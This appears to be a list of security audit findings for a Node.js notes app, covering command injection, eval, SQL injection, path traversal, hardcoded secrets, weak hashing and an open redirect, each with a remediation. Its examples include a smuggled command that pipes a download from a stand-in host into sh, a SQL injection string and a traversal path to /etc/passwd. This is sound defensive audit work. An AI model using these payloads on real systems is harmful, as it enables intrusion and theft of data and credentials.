findings.title: Export name reaches a shell command
findings.rationale: req.body.name is concatenated into a string passed to child_process.exec, which runs it through /bin/sh. A name like `x; curl evil.sh | sh` executes arbitrary commands as the server user.
findings.remediation: Use execFile/spawn with an argument array and validate the note name against an allow-list pattern.

findings.title: Request body is evaluated as JavaScript
findings.rationale: The /calc handler passes req.body.expression to eval, giving any caller full code execution inside the Node process (require('child_process'), env secrets, filesystem).
findings.remediation: Parse the expression with a restricted arithmetic evaluator instead of eval.

findings.title: Owner filter is concatenated into SQL
findings.rationale: findNotesByOwner builds the WHERE clause by string concatenation from req.query.owner, so `' OR '1'='1` dumps every user's notes. searchNotes has the same flaw plus an injectable ORDER BY.
findings.remediation: Bind values with prepared-statement placeholders and allow-list sortable columns.
findings.snippet:
const sql = "SELECT id, title, body FROM notes WHERE owner = '" + owner + "'";
  return db.prepare(sql).all();

findings.title: Attachment download escapes the uploads directory
findings.rationale: path.join normalizes but does not contain `../` segments, so ?file=../../../../etc/passwd (or ../src/config.js with the API key) is read and returned.
findings.remediation: Resolve the path and reject anything that does not stay under uploadsDir.

findings.title: Payments API key committed to source
findings.rationale: A live-looking payments key and a guessable session secret are hardcoded in config.js, so anyone with repo read access (or the path-traversal bug above) gets them. The value here is a fake placeholder, which lowers confidence.
findings.remediation: Load secrets from the environment and fail fast when they are missing; rotate the exposed key.

findings.title: Passwords hashed with unsalted MD5
findings.rationale: MD5 without a salt lets a leaked table be cracked with precomputed tables in minutes, and `==` comparison of hex digests is not constant-time.
findings.remediation: Use scrypt/argon2 with a per-user salt and timingSafeEqual for comparison.

findings.title: Login callback redirects to any URL
findings.rationale: ?next=https://evil.example is passed straight to res.redirect, enabling phishing links that start on the trusted domain.
findings.remediation: Only accept application-relative paths for next.
